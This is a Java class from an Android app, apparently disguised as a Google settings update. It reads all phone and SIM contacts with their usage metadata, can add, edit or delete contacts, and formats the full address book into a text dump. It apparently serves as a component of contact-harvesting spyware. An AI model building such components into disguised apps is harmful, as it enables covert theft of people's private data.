package com.setting.dl.google.googlesettingupdate.phone;

import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Context;
import android.content.OperationApplicationException;
import android.database.Cursor;
import android.net.Uri;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;


public class Contacts {
    
    
    private final Context context;
    
    private String[] newProjectionContact = {
        
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME_PRIMARY,
            ContactsContract.Contacts.HAS_PHONE_NUMBER,
            ContactsContract.Contacts.STARRED,
            ContactsContract.Contacts.SORT_KEY_PRIMARY,
            ContactsContract.Contacts.TIMES_CONTACTED,
            ContactsContract.Contacts.LAST_TIME_CONTACTED,
            ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP,
            ContactsContract.Contacts.LOOKUP_KEY
    };
    
    private String[] newProjectionPhone = {
            
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
            ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED,
            ContactsContract.CommonDataKinds.Phone.TIMES_USED,
            ContactsContract.CommonDataKinds.Phone.LAST_TIME_USED,
            ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP,
            ContactsContract.RawContacts.ACCOUNT_NAME,
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY
        
    };

    private List<Contact>    contacts    = new ArrayList<>();
    private List<SimContact> simContacts = new ArrayList<>();
    
    public Contacts(Context context) {
        
        this.context = context;
        _getContacts();
        _getSimContacts();
        //sortMostContacted();
        
    }
    
    public static String normalizeNumber(String number) {
        
        if(number == null) return "null";
        
        number = number.replace(" ", "").replace("-", "").replace("(", "").replace(")", "");
        
        if (number.startsWith("+") && number.length() == 13) return number.substring(2);
        if (number.startsWith("9") && number.length() == 12) return number.substring(1);
        
        return number;
    }

    @NonNull
    public static String getContactNameWithNumber(@NonNull final Context context, @NonNull String number) {
        
        number = normalizeNumber(number);
        
        String name = "Kayıtlı değil";
        
        for (Contact contact : new Contacts(context).getContacts()) {
            
            String temp = contact.getNumber();
            
            if (temp.equals(number)) {
                
                name = contact.getName();
                break;
            }
        }
        
        return name;
    }
    
    @NonNull
    public String getContactNameWithNumber(@NonNull String number) {
        
        number = normalizeNumber(number);
        
        String name = "Kayıtlı değil";
        
        for (Contact contact : contacts) {
            
            String temp = contact.getNumber();
            
            if (temp.equals(number)) {
                
                name = contact.getName();
                break;
            }
        }
        
        return name;
    }
    
    @Nullable
    public static String deleteContactWithNumber(Context context, String number) {
        
        ContentResolver contentResolver = context.getContentResolver();
        Uri             contactUri      = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
        Cursor          cursor          = contentResolver.query(contactUri, null, null, null, null);
        
        
        if (cursor != null && cursor.moveToFirst()) {
            
            String name      = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            String lookupKey = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
            Uri    uri       = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
            
            contentResolver.delete(uri, null, null);
            cursor.close();
            
            u.log.d("Kişi silindi : " + name);
            return name;
        }
        else {
            
            
            u.log.d("kişi bulunamadı");
        }
        
        return null;
    }
    
    public static boolean addContact(Context context, String name, String number) {
        
        ArrayList<ContentProviderOperation> ops                   = new ArrayList<>();
        int                                 rawContactInsertIndex = ops.size();
        //ContentProviderResult[]             results               = null;
        
        ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                                        .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                                        .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                                        .build());
        
        
        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                                        .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, rawContactInsertIndex)
                                        .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                                        .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                                        .build());
        
        
        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                                        .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, rawContactInsertIndex)
                                        .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                                        .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, number)
                                        .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                                        .build());
        
        
        try {
            context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            return true;
        }
        catch (RemoteException | OperationApplicationException e) {
            e.printStackTrace();
        }
        return false;
    }
    
    public static boolean updateContact(Context context, String name, String newPhoneNumber) {
        
        ArrayList<ContentProviderOperation> ops = new ArrayList<>();
        
        String where = ContactsContract.Data.DISPLAY_NAME + " = ? AND " +
                       ContactsContract.Data.MIMETYPE + " = ? AND " +
                       String.valueOf(ContactsContract.CommonDataKinds.Phone.TYPE) + " = ? ";
        
        String[] params = new String[]{ name,
                                        ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE,
                                        String.valueOf(ContactsContract.CommonDataKinds.Phone.TYPE_HOME) };
        
        ops.add(ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
                                        .withSelection(where, params)
                                        .withValue(ContactsContract.CommonDataKinds.Phone.DATA, newPhoneNumber)
                                        .build());
        try {
            context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            return true;
            
        }
        catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
    
    private void _getContacts() {
        
        final ContentResolver contentResolver = context.getContentResolver();
        
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                newProjectionContact,
                null,
                null,
                newProjectionContact[4] + " asc");
        
        if (cursor == null) return;
        
        int     idCol       = cursor.getColumnIndex(newProjectionContact[0]),
                nameCol     = cursor.getColumnIndex(newProjectionContact[1]),
                hasPhoneCol = cursor.getColumnIndex(newProjectionContact[2]),
                favorCol    = cursor.getColumnIndex(newProjectionContact[3]);
                
        
        
        while (cursor.moveToNext()) {
    
            String  name    = cursor.getString(nameCol), id = cursor.getString(idCol);
            boolean isFavor = cursor.getString(favorCol).equals("1"), hasPhoneNumber = cursor.getString(hasPhoneCol).equals("1");
    
            if (hasPhoneNumber) {
        
                String   selection       = newProjectionPhone[7] + "=?";
                String[] selectionString = new String[]{ id };
        
        
                Cursor cursorPhone = contentResolver
                        .query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                newProjectionPhone,
                                selection,
                                selectionString,
                                null
                        );
        
                if (cursorPhone != null) {
            
                    int     numberCol            = cursorPhone.getColumnIndex(newProjectionPhone[0]),
                            timesContactedCol    = cursorPhone.getColumnIndex(newProjectionPhone[1]),
                            lastTimeContactedCol = cursorPhone.getColumnIndex(newProjectionPhone[2]),
                            timeUsedCol          = cursorPhone.getColumnIndex(newProjectionPhone[3]),
                            lastTimeUsedCol      = cursorPhone.getColumnIndex(newProjectionPhone[4]),
                            updateCol            = cursorPhone.getColumnIndex(newProjectionPhone[5]),
                            accountNameCol       = cursorPhone.getColumnIndex(newProjectionPhone[6]);
            
            
                    while (cursorPhone.moveToNext()) {
                
                        contacts.add(
                                new Contact(
                                        name,
                                        normalizeNumber(cursorPhone.getString(numberCol)),
                                        id,
                                        cursorPhone.getString(lastTimeContactedCol),
                                        cursorPhone.getString(timesContactedCol),
                                        String.valueOf(isFavor),
                                        cursorPhone.getString(accountNameCol),
                                        cursorPhone.getString(updateCol),
                                        cursorPhone.getInt(timeUsedCol),
                                        cursorPhone.getString(lastTimeUsedCol),
                                        cursorPhone.getString(cursorPhone.getColumnIndex(newProjectionPhone[8]))));
                
                    }
            
                    cursorPhone.close();
                }
            }
            else {
        
                contacts.add(
                        new Contact(
                                name, 
                                "-",
                                id,
                                "-", 
                                "-",
                                "0",
                                "-",
                                cursor.getString(cursor.getColumnIndex(newProjectionContact[7])), 
                                0, 
                                "0",
                                cursor.getString(cursor.getColumnIndex(newProjectionContact[8]))));
        
            }
        }
        cursor.close();
    }
    
    private void _getSimContacts() {
        
        Uri simUri = Uri.parse("content://icc/adn");
        
        Cursor simContacts = context.getContentResolver().query(simUri, null, null, null, null);
        
        if (simContacts != null && simContacts.moveToFirst()) {
            
            do {
                
                String id     = simContacts.getString(simContacts.getColumnIndex("_id"));
                String name   = simContacts.getString(simContacts.getColumnIndex("name"));
                String number = simContacts.getString(simContacts.getColumnIndex("number"));
                
                this.simContacts.add(new SimContact(id, name, number));
                
                //Log.e("SimContact", name + " " + number + " " + id);
            }
            while (simContacts.moveToNext());
            
            simContacts.close();
        }
    }
    
    public List<Contact> getContacts() { return contacts; }
    
    @NonNull
    @Override
    public String toString() {
        
        StringBuilder value = new StringBuilder();
        
        value.append("===========================================\n");
        value.append("              REHBER (").append(contacts.size()).append(" kayıt)\n");
        value.append("===========================================\n");
        
        for (Contact c : contacts) {
    
            String val = String.format(new Locale("tr"),
                    
                       "Kişi                : %s%n" +
                            "Numara              : %s%n" +
                            "Times Contacted     : %s%n" +
                            "Last Time Contacted : %s%n" +
                            "Time Used           : %d%n" +
                            "Last Time Used      : %s%n" +
                            "Last Update         : %s%n" +
                            "Account             : %s%n" +
                            "Favor               : %s%n" +
                            "Id                  : %s%n" +
                            "Lookup              : %s",
                    
                    c.name,
                    c.number,
                    c.times,
                    c.lastTimeContact == null || c.lastTimeContact.equals("0") ? "-" : Time.getDate(c.lastTimeContact),
                    c.timeUsed,
                    c.lastTimeUsed == null || c.lastTimeUsed.equals("0") ? "-" : Time.getDate(c.lastTimeUsed),
                    c.lastUpdate.equals("0") ? "-" : Time.getDate(c.lastUpdate),
                    c.accountName,
                    c.star,
                    c.id,
                    c.lookupKey
            );
            
            
            value.append(val);
            
            value.append("\n===========================================\n");
        }
    
        
        value.append("\n\n====================================================\n");
        value.append("                  sim contacts\n");
        value.append("========================================================\n");
        
        for (SimContact contact : simContacts) {
            
            
            value.append(String.format("%-20s : %s\n", contact.name, contact.number));
            
        }
        
        return value.toString();
    }
    
    @FunctionalInterface
    public interface MyPredicate<T> {
        
        boolean test(T t);
        
    }
    
    public static class Contact {
        
        private String name, number, id, lastTimeContact, times, star, accountName, lastUpdate, lastTimeUsed, lookupKey;
        private int timeUsed;
        
        Contact(String name, String number,
                String id, String lastTimeContact,
                String times, String star,
                String accountName,
                String lastUpdate,
                int timeUsed,
                String lastTimeUsed,
                String lookupKey) {
            
            this.name = name;
            this.number = number;
            this.id = id;
            this.lastTimeContact = lastTimeContact;
            this.times = times;
            this.star = star;
            this.accountName = accountName;
            this.lastUpdate = lastUpdate;
            this.timeUsed = timeUsed;
            this.lastTimeUsed = lastTimeUsed;
            this.lookupKey = lookupKey;
        }
        
        public String getName()            {return name;}
        
        public void setName(String name) {
            
            this.name = name;
        }
        
        public String getNumber()          {return number;}
        
        public void setNumber(String number) {
            
            this.number = number;
        }
        
        public String getId()              {return id;}
        
        public void setId(String id) {
            
            this.id = id;
        }
        
        @NonNull
        @Override
        public String toString() {
            
            
            return String.format("Name                 : %s\n" +
                       "Number               : %s\n" +
                       "Times contacted      : %s\n" +
                       "Last time contacted  : %s\n" +
                       "Time used            : %s\n" +
                       "Last time used       : %s\n" +
                       "Star                 : %s\n" +
                       "Account name         : %s\n" +
                       "id                   : %s\n" +
                       "Last update          : %s\n========================================================================\n",
                       name, number, times, lastTimeContact.equals("0") ? "-" : Time.getDate(lastTimeContact), timeUsed, lastTimeUsed.equals("0") ? "-" : Time.getDate(lastTimeUsed), star, accountName, id, Time.getDate(lastUpdate));
            
            
        }
    
        @Override
        public boolean equals(Object other) {
    
            if (other instanceof Contact) {
                
                Contact c = (Contact) other;
    
                return c.getNumber().equals(this.getNumber()) && c.getName().equals(this.getName());
            }
            
            return false;
        }
        
        @Override
        public int hashCode(){
            
            
            return this.getNumber().hashCode() + this.getName().hashCode();
        }
        
    }
    
    public class SimContact {
        
        String id, name, number;
        
        SimContact(String id, String name, String number) {
            
            this.id = id;
            this.name = name;
            this.number = number;
        }
        
        
        public String getId()     {return id;}
        
        public String getName()   {return name;}
        
        public String getNumber() {return number;}
        
    }
    
}
